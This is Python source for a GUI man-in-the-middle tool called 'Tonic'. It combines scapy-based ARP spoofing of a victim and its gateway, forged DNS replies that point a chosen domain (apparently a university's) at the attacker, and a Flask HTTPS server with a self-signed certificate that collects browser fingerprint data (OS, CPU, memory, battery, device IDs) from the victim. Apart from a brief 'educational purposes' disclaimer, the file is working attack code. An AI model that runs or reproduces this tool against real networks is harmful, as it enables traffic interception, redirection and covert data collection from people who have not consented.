
import interface

import tkinter as tk
import threading
import queue
from tkinter import ttk,messagebox
import os
import time
import threading
from utils import is_valid_ip,get_network_config,is_ip_in_same_network,im_i_target,get_system_info,is_port_in_use
from dns_spoof import DNSSpoofer
from arp_spoof import ARPSpoofer,ExceptionMacAddress
from web_server import WEBServer
from scapy import error
import requests
import json
from datetime import datetime

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Tonic")
        self.setup_geometry()
        
        self.current_tab = tk.StringVar(value="Local Network Target")
        
        # Navbar setup
        self.navbar = ttk.Frame(self)
        self.navbar.pack(side="top", fill="x")
        
        self.content_frame = ttk.Frame(self)
        self.content_frame.pack(fill="both", expand=True)
        
        # self.create_navbar_buttons()
        # self.update_navbar()
        self.show_frame(LocalNetworkFrame)

    def setup_geometry(self):
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        window_width = screen_width // 2
        window_height = screen_height // 2
        self.geometry(f"{window_width}x{window_height}+{screen_width//4}+{screen_height//4}")

    # def create_navbar_buttons(self):
    #     self.local_network_button = ttk.Button(self.navbar, text="Local Network Target", 
    #                                            command=lambda: self.change_tab("Local Network Target", LocalNetworkFrame))
    #     self.local_network_button.pack(side="left", padx=5, pady=5)

    #     self.host_target_button = ttk.Button(self.navbar, text="Host Target", 
    #                                          command=lambda: self.change_tab("Host Target", HostTargetFrame))
    #     self.host_target_button.pack(side="left", padx=5, pady=5)

    def change_tab(self, tab_name, frame_class):
        if self.current_tab.get() != tab_name:
            self.current_tab.set(tab_name)
            self.update_navbar()
            self.show_frame(frame_class)

    def update_navbar(self):
        style = ttk.Style()
        style.configure("TButton", font=("Arial", 12), padding=10)
        style.configure("Selected.TButton", font=("Arial", 12, "bold"), background="#C8EE85")
        
        if self.current_tab.get() == "Local Network Target":
            self.local_network_button.config(style="Selected.TButton")
            self.host_target_button.config(style="TButton")
        else:
            self.local_network_button.config(style="TButton")
            self.host_target_button.config(style="Selected.TButton")

    def show_frame(self, frame_class):
        for widget in self.content_frame.winfo_children():
            widget.destroy()
        frame_class(self.content_frame).pack(fill="both", expand=True)

class LocalNetworkFrame(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self.pack(fill="both", expand=True)

        self.stop_event = None 
        self.arp_thread = None 
        self.dns_thread = None 
        self.web_server_thread = None 


        # Initialize the UI elements
        self.setup_ui()

    def setup_ui(self):
        # Label "Local Network Attack" in bold, left-aligned
        label = ttk.Label(self, text="Local Network Attack", font=("Arial", 18, "bold"), anchor="w")
        label.pack(pady=10, padx=20, anchor="w")

        # Description label
        description_label = ttk.Label(self, text="Ensure that Tonic has the appropriate privilege access. Enter the target IP address and the default gateway, ensuring both are accessible and properly configured.", font=("Arial", 12), anchor="w")
        description_label.pack(pady=5, padx=20, anchor="w")

        # Target IP Address Input
        target_ip_frame = ttk.Frame(self)
        target_ip_frame.pack(pady=5, padx=20, fill="x")
        ttk.Label(target_ip_frame, text="Target IP Address:", font=("Arial", 12), width=25).pack(side="left")
        self.target_ip_entry = ttk.Entry(target_ip_frame)
        self.target_ip_entry.pack(side="left", fill="x", expand=True)

        # Default Gateway IP Address Input
        default_gtw_frame = ttk.Frame(self)
        default_gtw_frame.pack(pady=5, padx=20, fill="x")
        ttk.Label(default_gtw_frame, text="Default Gateway IP Address:", font=("Arial", 12), width=25).pack(side="left")
        self.default_gtw_entry = ttk.Entry(default_gtw_frame)
        self.default_gtw_entry.pack(side="left", fill="x", expand=True)

        # Create a frame to hold the buttons on the same line
        button_frame = ttk.Frame(self)
        button_frame.pack(pady=5, padx=20, fill="x")

        # Get Local OS Info button (aligned to the left)
        self.local_os_info_button = ttk.Button(button_frame, text="Get Local OS Info", command=self.get_local_info)
        self.local_os_info_button.pack(side="left", padx=5)

        # Create a separate frame for the right-aligned buttons
        right_button_frame = ttk.Frame(button_frame)
        right_button_frame.pack(side="right")

        # Start Attack button (aligned to the right)
        self.start_attack_button = ttk.Button(right_button_frame, text="Start Attack", command=self.start_attack)
        self.start_attack_button.pack(side="left", padx=5)

        # Stop Attack button (aligned to the right)
        self.stop_attack_button = ttk.Button(right_button_frame, text="Stop Attack", command=self.stop_attack)
        self.stop_attack_button.pack(side="left", padx=5)

        # Labels for DNS Spoofing, ARP Spoofing, Web Server (with dots)
        attack_types_frame = ttk.Frame(self)
        attack_types_frame.pack(pady=5, padx=20, anchor="w")

        # Example booleans for demonstration
        dns_spoofing_active = False
        arp_spoofing_active = False
        web_server_active = False

        # Function to add colored dot before the label
        def create_labeled_dot(label_text, is_active):
            dot_color = "green" if is_active else "red"
            dot = ttk.Label(attack_types_frame, text="•", foreground=dot_color, font=("Arial", 12))
            dot.pack(side="left")
            label = ttk.Label(attack_types_frame, text=label_text, font=("Arial", 12))
            label.pack(side="left", padx=5)
            return dot, label

        # Creating the dots and labels for each attack type
        self.dns_dot, self.dns_label = create_labeled_dot("DNS Spoofing", dns_spoofing_active)
        self.arp_dot, self.arp_label = create_labeled_dot("ARP Spoofing", arp_spoofing_active)
        self.web_dot, self.web_label = create_labeled_dot("Web Server", web_server_active)

        # Scrollable text area for logs (taking the remaining space)
        log_text_frame = ttk.Frame(self)  # Frame to hold text area and scrollbar
        log_text_frame.pack(pady=10, padx=20, fill="both", expand=True)

        # Add Scrollbar
        scrollbar = ttk.Scrollbar(log_text_frame)
        scrollbar.pack(side="right", fill="y")

        self.log_text_area = tk.Text(log_text_frame, height=10, wrap="word", state="normal", yscrollcommand=scrollbar.set)
        self.log_text_area.pack(fill="both", expand=True)

        # Link the scrollbar to the text widget
        scrollbar.config(command=self.log_text_area.yview)

        

        self.log_message_to_user('''
======================================================
                    WELCOME TO''',date=False)
        # Set the default message in the text area
        self.set_default_message()
        self.log_message_to_user('''
          The all-in-one ManInTheMiddle
======================================================''',date=False)
        self.log_message_to_user('''\n-> Designed for network analysis and remote reconnaissance. ''',date=False)

        self.log_message_to_user('''
💡 **Key Features:**
    - **Spoofing** (DNS, ARP): Intercept and redirect network traffic seamlessly.
    - **Multi-Protocol Reconnaissance**: HTTP, HTTPS, DNS and more!
                                 
🔒 **Important:**
   This tool is intended for educational purposes and authorized testing only. Misuse may result in legal consequences.

''',date=False)
        self.log_message_to_user('Start by filling necessay input and start the attack...')
        self.log_text_area.see('1.0')

        

    def set_default_message(self):
        default_text = '''.----------------------------------------------------.
|                                                    |
|                                                    |
| .-') _                     .-') _                  |
|(  OO) )                   ( OO ) )                 |
|/     '._  .-'),-----. ,--./ ,--,' ,-.-')   .-----. |
||'--...__)( OO'  .-.  '|   \ |  |\ |  |OO) '  .--./ |
|'--.  .--'/   |  | |  ||    \|  | )|  |  \ |  |('-. |
|   |  |   \_) |  |\|  ||  .     |/ |  |(_//_) |OO  )|
|   |  |     \ |  | |  ||  |\    | ,|  |_.'||  |`-'| |
|   |  |      `'  '-'  '|  | \   |(_|  |  (_'  '--'\ |
|   `--'        `-----' `--'  `--'  `--'     `-----' |
|                                                    |
|                                                    |
'----------------------------------------------------' '''
        
        # self.log_text_area.config(state="normal")  # Temporarily make the text area editable
        # self.log_text_area.insert(tk.END, default_text + "\n")  # Insert the default text
        # self.log_text_area.config(state="disabled")  # Make the text area non-editable again
        self.log_message_to_user(default_text,date=False)


    def log_message_to_user(self,message,date=True) :
        current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if date == True :
            finale_output = f"{current_date} ~ {message}\n"
        else :
            finale_output = f"{message}\n"

        self.log_text_area.config(state="normal")  # Temporarily make the text area editable
        self.log_text_area.insert(tk.END,finale_output )
        self.log_text_area.see(tk.END)  # Insert the default text
        self.log_text_area.config(state="disabled")

    def start_attack(self):
        def format_result(data) :
            # Parse the content
            content = json.loads(data.decode('utf-8'))

            # Organizing data into separate categories
            os_info = [
                f"Operating System: {content['os']}",
                f"CPU Cores: {content['cpu']}",
                f"Memory: {content['memory']} GB"
            ]

            # Battery info (empty in this case)
            battery_info = [
                "Battery: Empty (No data available)" if not content.get('battery') else f"Battery: {content['battery']}"
            ]

            # Devices (peripherals)
            peripherals = []
            if 'devices' in content :
                for device in content['devices']:
                    peripherals.append(f"Device Type: {device['kind']}, Label: {device['label']}, Device ID: {device['deviceId']}")

            # Log in a structured way
            # print("Operating System Info:")
            self.log_message_to_user("\n\nOperating System Info:",date=True)
            for info in os_info:
                self.log_message_to_user(f"- {info}",date=False)
                # print(f"- {info}")

            # print("\nBattery Info:")
            self.log_message_to_user("\nBattery Info:",date=False)
            for info in battery_info:
                self.log_message_to_user(f"- {info}",date=False)
                # print(f"- {info}")

            # print("\nPeripherals (Devices):")
            self.log_message_to_user("\nPeripherals (Devices):",date=False)
            if len(peripherals) != 0 :
                for device in peripherals:
                    self.log_message_to_user(f"- {device}",date=False)
                    # print(f"- {device}")  
            else :
                self.log_message_to_user(f"- No Device detected",date=False)
            self.log_message_to_user(f"\n\n",date=False)

        # Get user input
        target_ip = self.target_ip_entry.get().strip()
        default_gtw = self.default_gtw_entry.get().strip()

        # Validate that all fields are filled
        if not target_ip or not default_gtw:
            messagebox.showerror("Input Error", "All fields are required.")
            return
        
        if not is_valid_ip(target_ip):
            messagebox.showerror("Invalid Input", "Invalid target IP address format.")
            return
        if not is_valid_ip(default_gtw):
            messagebox.showerror("Invalid Input", "Invalid default gtw IP address format.")
            return
        if not is_ip_in_same_network(target_ip):
            messagebox.showerror("Invalid Default Gateway", f'The provided target IP ({target_ip}) is not on your network.')
            return
        if not is_ip_in_same_network(default_gtw):
            messagebox.showerror("Invalid Default Gateway", f'The provided default gateway IP ({default_gtw}) is not on your network.')
            return
        if default_gtw == target_ip:
            messagebox.showerror("Invalid Input", "The target IP address must be distinct from the default gateway IP address.")
            return
        if im_i_target(target_ip):
            messagebox.showerror("Invalid Input", "The target IP address is the same sa your current IP address, please change.")
            return
        
        if is_port_in_use('0.0.0.0',443):
            messagebox.showerror("Unavailible 443 port", "The webserver used for this attack requires the PORT 443 and it is currently under use, please identify and stop that program to able to start the attack.")
            return

        # ---------------------------------------------------------------------------- #
        attacker_ip , attacker_mac = get_network_config()

        # ------------------- Event to control stopping of threads ------------------- #
        self.stop_event = threading.Event()


        # ---------------------------------------------------------------------------- #
        #                              Defining Listeners                              #
        # ---------------------------------------------------------------------------- #
         # ------------------------ Defining Exception Listener ----------------------- #
        #queue to collect exception
        exception_queue = queue.Queue()

        #Exception Sniffer
        def exception_listener():
            while True:
                try:
                    # Block until an exception is available
                    exception = exception_queue.get(timeout=1)  # Use timeout to check periodically
                    
                    print("EXCEPTIOPN EHERE dsqdsqdsq5454",exception)
                    if "Permission".lower() in str(exception.__context__).lower():
                        messagebox.showerror("Permission denied", "Please run this program as root.")
                        os._exit(0)
                    
                    self.stop_attack()

                except queue.Empty:
                    pass  # No exceptions in queue; keep checking
        # ----------------------- Defining Web server Listener ----------------------- #
        #Web server Queue
        web_server_q = queue.Queue()

        #Web server Queue Sniffer
        def web_server_queue_listener():
            while True:
                try:
                    # Block until an exception is available
                    
                    message = web_server_q.get(timeout=1)  # Use timeout to check periodically
                    print("\n\n",message)
                    if message["type"] == "Alert" :
                        # Log message to text area
                        # self.log_text_area.config(state="normal")  # Temporarily make the text area editable
                        # self.log_text_area.insert(tk.END, f"{message.get('content')}\n")
                        # self.log_text_area.config(state="disabled")  # Make the text area non-editable again
                        self.log_message_to_user(f"{message.get('content')}",date=True)
                    elif message["type"] == "Result" :
                        # # Log message to text area
                        # self.log_text_area.config(state="normal")  # Temporarily make the text area editable
                        # self.log_text_area.insert(tk.END, f"{message.get('content')}\n")
                        # self.log_text_area.config(state="disabled")  # Make the text area non-editable again
                        format_result(message.get("content"))
                except queue.Empty:
                    pass  # No exceptions in queue; keep checking

        # --------------------------- Definig DNS Listener --------------------------- #
        #Web server Queue
        dns_q = queue.Queue()

        #Web server Queue Sniffer
        def dns_queue_listener():
            while True:
                try:
                    # Block until an exception is available
                    
                    message = dns_q.get(timeout=1)  # Use timeout to check periodically
                    self.log_message_to_user(f"{message}",date=True)
                    
                except queue.Empty:
                    pass  # No exceptions in queue; keep checking


        # Start the listeners threads
        listener_thread = threading.Thread(target=exception_listener, daemon=True)
        queue_web_server_thread = threading.Thread(target=web_server_queue_listener, daemon=True)
        queue_dns_thread = threading.Thread(target=dns_queue_listener, daemon=True)

        listener_thread.start()
        queue_web_server_thread.start()
        queue_dns_thread.start()
        # ---------------------------------------------------------------------------- #

        # ---------------------------------------------------------------------------- #
        #                           Defining threads starters                          #
        # ---------------------------------------------------------------------------- #

        def run_dns_spoofer(attacker_ip,target_ip,dns_q):
            try :
                dns_spoofer = DNSSpoofer(attacker_ip=attacker_ip, victim_ip=target_ip, domain="usthb",queue=dns_q)
                dns_spoofer.spoof()
            except Exception as e: 
                print("\n\n***DNS ERROR CAPTURED***")
                print(str(e.args)+" \n\n")
                exception_queue.put(e)
                

        def run_arp_spoofer(target_ip,default_gtw,attacker_mac):
            try : 
                arp_spoofer = ARPSpoofer(victim_ip=target_ip, router_ip=default_gtw, attacker_mac=attacker_mac)
                arp_spoofer.spoof()
            except ExceptionMacAddress as e :
                messagebox.showerror("Unreachable device", e)
                exception_queue.put(e)
            except Exception as e :
                print("\n\n***ARP ERROR CAPTURED***")
                print(str(e)+" \n\n")
                exception_queue.put(e)


        def run_web_server(web_server_q):
            try : 
                web_server = WEBServer(web_server_q)
                web_server.listen()
            except Exception as e: 
                print("\n\n***FLASK ERROR CAPTURED***")
                print(str(e.__context__)+" \n\n")
                exception_queue.put(e)
        # ---------------------------------------------------------------------------- #



        # Create threads
        self.dns_thread = threading.Thread(target=run_dns_spoofer,args=[attacker_ip,target_ip,dns_q])
        self.dns_dot.config(foreground="green")

        self.arp_thread = threading.Thread(target=run_arp_spoofer,args=[target_ip,default_gtw,attacker_mac])
        self.arp_dot.config(foreground="green")

        
        self.web_server_thread = threading.Thread(target=run_web_server, args=(web_server_q,))
        self.web_dot.config(foreground="green")

        self.dns_thread.start()
        self.arp_thread.start()
        self.web_server_thread.start()

        # Update the dot labels to green
        self.dns_dot.config(foreground="green")
        self.arp_dot.config(foreground="green")
        self.web_dot.config(foreground="green")

        # ---------------------------------------------------------------------------- #

        # Log message to text area
        self.log_message_to_user(f"Starting attack on {target_ip} (Gateway: {default_gtw})...",date=True)

    def get_local_info(self):
        self.log_message_to_user("Getting Current OS info...",date=True)
        self.log_message_to_user("\n\n"+get_system_info()+"\n\n",date=False)
        # messagebox.showerror("Local OS Informations", get_system_info())

    def stop_attack(self):
        print("STOPING THE ATTACK dsqdsqddsqld")
        if self.dns_thread != None or self.arp_thread != None or self.web_server_thread != None :
            
            # Stop threads by setting the stop event
            self.stop_event.set()
            self.dns_dot.config(foreground="red")
            self.arp_dot.config(foreground="red")
            self.web_dot.config(foreground="red")

            # print("dns thread",self.dns_thread)
            # print("web thread",self.web_server_thread)
            # print("arp thread",self.arp_thread)
            

            # # Wait for threads to finish
            # if self.dns_thread :
            #     self.dns_thread.join()
            self.dns_thread = None
            # if self.arp_thread:
            #     self.arp_thread.join()
            self.arp_thread = None
            # if self.web_server_thread:
            # self.web_server_thread.join()
            self.web_server_thread = None
            try : 
                url = "https://localhost:443/force_shutdown"
                requests.post(url, verify=False)
            except :
                #closing web server throws an exception
                pass
    
            # Reset the dot labels to red

            # Log message to text area
            self.log_text_area.config(state="normal")  # Temporarily make the text area editable
            self.log_text_area.insert(tk.END, f"Stopping the attack, everything back to normal...\n")
            self.log_text_area.config(state="disabled")  # Make the text area non-editable again


# ------------------------------- FLASK SERVER ------------------------------- #
from flask import Flask,redirect,render_template,flash,request,make_response,jsonify
from flask_cors import CORS,cross_origin
import os
import logging
import json, os, signal
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from utils import get_network_config
import datetime
class WEBServer:
    
    def __init__(self,web_server_q) -> None:
        '''
            Flask web server
        '''
        if web_server_q :
            self.queue = web_server_q
        else :
            self.queue = None
        # Générer une clé privée RSA
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )

        # Sauvegarder la clé privée dans un fichier
        with open("key.pem", "wb") as key_file:
            key_file.write(
                private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption(),
                )
            )
        # Définir les informations du certificat
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"My Company"),
            x509.NameAttribute(NameOID.COMMON_NAME, u"mydomain.com"),
        ])

        # Créer le certificat
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            # Le certificat est valide pour 1 an
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName(u"mydomain.com")]),
            critical=False,
        ).sign(private_key, hashes.SHA256())

        # Sauvegarder le certificat dans un fichier
        with open("cert.pem", "wb") as cert_file:
            cert_file.write(
                cert.public_bytes(serialization.Encoding.PEM)
            )

        print("Certificat et clé générés : cert.pem et key.pem")
    def shutdown_server(self):
        func = request.environ.get('werkzeug.server.shutdown')
        if func is None:
            raise RuntimeError('Not running with the Werkzeug Server')
        func()

    def writeInQueue(self,message):
        print("Writing in QUEUE",self.queue)
        if self.queue :
            self.queue.put(message)

    def listen(self):
        logging.getLogger('flask_cors').setLevel(logging.DEBUG)
        app = Flask(__name__)
        app.secret_key = 'dqsddqdsdgfrgerefdmkodsjfhdslkj<fhdsqopfhdspofh'

        CORS(app, origins=["http://finfo.usthb.dz", "http://192.168.1.73"])

        @app.route("/")
        def index():
            self.writeInQueue({
                'type' : "Alert",
                'content' : "Victim Visited the target website..."
            })
            return render_template('index.html')
        
        @app.post("/index")
        @cross_origin()
        def data():
            # print(request.data)
            # flash(f"Received data: Name - {request.data}")
            data = json.loads(request.data.decode('utf-8'))

            # Beautiful print function
            def pretty_print(data):
                print(json.dumps(data, indent=4, sort_keys=True))

            pretty_print(data)
            self.writeInQueue({
                'type' : "Result",
                'content' : request.data
            })
            response = make_response(jsonify(None), 200)
            return response
        
        @app.route('/force_shutdown', methods=['POST'])
        def force_shutdown():
            # os._exit(0)
            # self.shutdown_server()
            os.kill(os.getpid(), signal.SIGINT)
            return make_response(jsonify(None), 200)

        try :
            app.run(host='0.0.0.0',port=443,debug=False, use_reloader=False, ssl_context=('cert.pem', 'key.pem')) 
            print("DSQDSQDSQDSQD656")
        except Exception as e :
            print("FLASK dsqdqsdsqsq ",e)
        
# ---------------------------------------------------------------------------- #

from scapy.all import ARP, Ether, send, sniff, IP, TCP, srp
import time


class ExceptionMacAddress(Exception):
    def __init__(self, message):
        super().__init__(message)  # Initialize the base class (Exception) with the message
        # self.context = context  # Store the context data

    def __str__(self):
        return f"{self.args[0]}"


class ARPSpoofer:
    def __init__(self,victim_ip:str,router_ip:str,attacker_mac:str,victim_mac=None,router_mac=None,clockRate=None) -> None:
        '''
            For a successfull ARP spoofing we need the victim ip @ and it's default gtw

            -The local network will be fluded with spoofed ARP request wihch will lead 
             to changing the arp table of the victim and the router (concerned lines 
             only) 

            Args :
                -ClockRate : 
                    the interval in seconds between arp spoofed packet creation
                    if set to False => no clock rate applied will result in an Agressive spoof.

        '''
        self.victim_ip = victim_ip
        self.router_ip = router_ip
        self.attacker_mac = attacker_mac

        self.victim_mac = victim_mac
        self.router_mac = router_mac
        self.clockRate = clockRate
    
       

    def getContextMac(self,victime=True)->str:
        """Get the MAC address of the victim/router."""
        if victime :
            mac = self.getIpMac(self.victim_ip)
            if not mac :
                raise Exception("Could not get VICTIM MAC addresses. Ensure the device is reachable.")
            self.victim_mac = mac
        mac = self.getIpMac(self.router_ip)
        if not mac :
                raise Exception("Could not get GTW MAC addresses. Ensure the device is reachable.")
        self.router_mac = mac
          
    
    def getIpMac(self,ip:str)->str:
        """Get the MAC address of the IP."""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, verbose=True)[0]
        
        return answered_list[0][1].hwsrc if answered_list else None
    
    def spit(self):
        """Send ARP spoofing packets to the victim and the router."""
        arp_response_victim = ARP(op=2, psrc=self.router_ip, pdst=self.victim_ip, hwdst= self.router_mac, hwsrc=self.attacker_mac)
        arp_response_router = ARP(op=2, psrc=self.victim_ip, pdst=self.router_ip, hwdst=self.victim_mac, hwsrc=self.attacker_mac)
        
        send(arp_response_victim, verbose=False)
        send(arp_response_router, verbose=False)

    def clean(self):
        """Restore the ARP tables."""
        arp_response_victim = ARP(op=2, psrc=self.router_ip, pdst=self.victim_ip, hwsrc=self.router_mac)
        arp_response_router = ARP(op=2, psrc=self.victim_ip, pdst=self.router_ip, hwsrc=self.victim_mac)
        
        send(arp_response_victim, count=5, verbose=False)
        send(arp_response_router, count=5, verbose=False)

    def prepareSpoof(self):
        # Get the router's MAC address
        print("VICTIM MAC",self.victim_mac)
        if not self.victim_mac :
            self.getContextMac(victime=True)
        else :
            print("VICTIM MAC",self.victim_mac)
            
        # Get the victim's MAC address
        if not self.router_mac :
            self.getContextMac(victime=False)
        else :
            print("ROUTER MAC",self.router_mac)

        if self.victim_mac is None :
            # exit(1)
            raise ExceptionMacAddress("Could not get victim MAC addresse. Ensure the device is reachable.")
        if  self.router_mac is None :
            # exit(1)
            raise ExceptionMacAddress("Could not get gtw MAC addresse. Ensure the devices are reachable.")
        
        self.fillVictimeARPTable()

        print("Starting ARP spoofing...")
    
    def fillVictimeARPTable(self):
        for i in range(0,10):
            arp_victime = ARP(op=2, pdst=self.victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.router_ip, hwsrc=self.router_mac)
            send(arp_victime, verbose=False)
        

    def spoof(self):
        try:
            self.prepareSpoof()
            # return ;

            
            while True:
                self.spit()
                if self.clockRate:
                    time.sleep(self.clockRate) 
            

        except KeyboardInterrupt:
            print("\nStopping ARP spoofing...")
            self.clean()


# ---------------------------------------------------------------------------- #


from scapy.all import ARP, Ether, send, sniff, srp
from scapy.layers.dns import DNS,DNSQR,DNSRR,UDP,IP,TCP
class DNSSpoofer:
    def __init__(self,attacker_ip:str,victim_ip:str,domain=None,queue=None) -> None:
        self.attacker_ip = attacker_ip
        self.victim_ip = victim_ip

        self.domain = domain

        if queue :
            self.queue = queue
        else :
            self.queue = None
    
    def writeInQueue(self,message):
        if self.queue :
            self.queue.put(message)

    def spit(self,pkt):
        """Spoof DNS responses for DNS queries."""
        if pkt.haslayer(DNS) and pkt[IP].src == self.victim_ip :
            qname = pkt[DNSQR].qname.decode()
            # print("DNS PACKET",qname)

            # Check for the domain you want to spoof
            #if b"example.com" in qname:  
            # Create the DNS response
            if self.domain :
               
                if self.domain.strip().lower() in qname :
                    dns_response = (
                        IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
                        UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
                        DNS(
                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  # Query data from original packet
                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Spoofed response
                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Authority section
                        )
                    )
                    # Send the spoofed DNS response to the victim
                    send(dns_response, verbose=False)
                    self.writeInQueue(f"[+] Sent spoofed DNS response with IP {self.attacker_ip} for {qname}")
            else :
                dns_response = (
                        IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
                        UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
                        DNS(
                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  # Query data from original packet
                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Spoofed response
                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Authority section
                        )
                    )
                # Send the spoofed DNS response to the victim
                send(dns_response, verbose=False)
                print(f"[+] Sent spoofed DNS response with IP {self.attacker_ip} for {qname}")

                
           
    
    def sniff(self):
        print('Starting DNS sniff...')
        sniff(filter="ip", prn=self.spit, store=0)

    def spoof(self):
        try:
            self.sniff()
        except KeyboardInterrupt:
            print("\nStopping DNS spoofing...")
# ---------------------------------------------------------------------------- #


import re
import socket
import psutil
from uuid import getnode as get_mac
import ipaddress
import netifaces
import threading

import platform
import psutil
import socket
import os


def is_valid_ip(ip):
    # Regular expression for a valid IPv4 address
    pattern = r'^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    
    # Check if the IP matches the pattern
    if re.match(pattern, ip):
        # Check if each octet is in the range of 0-255
        return all(0 <= int(octet) <= 255 for octet in ip.split('.'))
    return False

def get_network_config():
    # # Get the local machine name
    # host_name = socket.gethostname()
    # # Get the IP address associated with the local machine name
    # ip_address = socket.gethostbyname(host_name)
    ip_address = socket.gethostbyname_ex(socket.gethostname())[-1][-1]

    mac = get_mac_address(ip_address)
    # mac  = ':'.join(['{:02x}'.format((mac_int >> (i * 8)) & 0xff) for i in range(5, -1, -1)])

    return ip_address , mac

def is_ip_in_same_network(ip_to_check):
    ip, mac = get_network_config()
    mask = get_network_mask(ip)
    print("mask",mask)
    # Create network object using network_ip and subnet_mask (subnet mask can be represented as prefix length)
    network = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
    
    # Create an IP object for the IP to check
    ip = ipaddress.IPv4Address(ip_to_check)
    
    # Check if the IP is in the network
    return ip in network

def im_i_target(ip_target):
    ip, mac = get_network_config()
    return True if ip == ip_target else False

def get_network_mask(ip_address):
    # Get all network interfaces
    interfaces = netifaces.interfaces()

    # Loop through interfaces to find the one with the matching IP address
    for interface in interfaces:
        addrs = netifaces.ifaddresses(interface)

        # Check if the interface has an IPv4 address (AF_INET)
        if netifaces.AF_INET in addrs:
            # Loop through the IPv4 addresses
            for addr in addrs[netifaces.AF_INET]:
                # If the IP matches, return the network mask
                if addr['addr'] == ip_address:
                    return addr['netmask']

    return None  # If no match is found

def get_mac_address(ip_address):
    # Get all network interfaces
    interfaces = netifaces.interfaces()

    # Loop through interfaces to find the one with the matching IP address
    for interface in interfaces:
        addrs = netifaces.ifaddresses(interface)

        # Check if the interface has an IPv4 address (AF_INET)
        if netifaces.AF_INET in addrs:
            # Loop through the IPv4 addresses
            for addr in addrs[netifaces.AF_INET]:
                # If the IP matches, get the MAC address of the interface
                if addr['addr'] == ip_address:
                    # Check if the interface has a MAC address (AF_LINK)
                    if netifaces.AF_LINK in addrs:
                        # Return the MAC address
                        return addrs[netifaces.AF_LINK][0]['addr']
    return None




def get_system_info():
     # Fonction spécifique pour récupérer les périphériques
    def get_all_devices():
        devices = []
        if platform.system() == "Windows":
            try:
                import wmi
                c = wmi.WMI()

                # Récupère les périphériques USB
                for usb in c.Win32_USBControllerDevice():
                    devices.append(usb.Dependent.Caption)

                # Récupère les périphériques audio
                for audio in c.Win32_SoundDevice():
                    devices.append(audio.Caption)

                # Récupère les périphériques d'entrée
                for input_device in c.Win32_Keyboard():
                    devices.append(input_device.Caption)
                for input_device in c.Win32_PointingDevice():
                    devices.append(input_device.Caption)

            except ImportError:
                print("WMI module not installed. Device details may be incomplete.")
        else:
            # Sur Linux, on peut utiliser `lsusb` pour récupérer des périphériques USB
            if os.path.exists("/usr/bin/lsusb"):
                try:
                    with os.popen("lsusb") as f:
                        for line in f:
                            devices.append(line.strip())
                except Exception as e:
                    print(f"Error fetching devices: {e}")
            else:
                devices.append("lsusb command not available.")

        # Affiche la liste de tous les périphériques trouvés
        for device in devices:
            print(device)
    info = {}

    # Système d'exploitation
    info["OS"] = platform.system()
    info["OS Version"] = platform.version()
    info["OS Release"] = platform.release()

    # Processeur
    info["Physical Cores"] = psutil.cpu_count(logical=False)
    info["Total Cores"] = psutil.cpu_count(logical=True)
    info["Processor"] = platform.processor()

    # RAM
    ram = psutil.virtual_memory()
    info["Total RAM"] = f"{ram.total / (1024 ** 3):.2f} GB"

    # Batterie (si disponible)
    if psutil.sensors_battery():
        battery = psutil.sensors_battery()
        info["Battery Percentage"] = f"{battery.percent}%"
        info["Power Plugged"] = battery.power_plugged
    else:
        info["Battery"] = "No battery detected"

    # Périphériques connectés
    devices = []
    for device in psutil.disk_partitions():
        devices.append({
            "Device": device.device,
            "Mount Point": device.mountpoint,
            "File System Type": device.fstype
        })
    info["Connected Devices"] = devices

    # # Affichage des informations
    # for key, value in info.items():
    #     print(f"{key}: {value}")
    # get_all_devices()

    def format_system_info(info):
        """Format system information dictionary into a human-readable string."""
        formatted = []
        
        def add_line(key, value, indent=0):
            """Helper function to add a line with proper indentation."""
            formatted.append(f"{' ' * indent}{key}: {value}")
        
        for key, value in info.items():
            if isinstance(value, list):  # Handle lists
                add_line(key, "", indent=0)
                for i, item in enumerate(value):
                    add_line(f"  - Device {i + 1}", "", indent=2)
                    if isinstance(item, dict):  # Handle nested dictionaries
                        for sub_key, sub_value in item.items():
                            add_line(f"{sub_key}", sub_value, indent=4)
                    else:
                        add_line(f"{item}", "", indent=4)
            elif isinstance(value, dict):  # Handle nested dictionaries
                add_line(key, "", indent=0)
                for sub_key, sub_value in value.items():
                    add_line(f"{sub_key}", sub_value, indent=2)
            else:  # Handle simple key-value pairs
                add_line(key, value, indent=0)
        
        return "\n".join(formatted)
    return format_system_info(info)

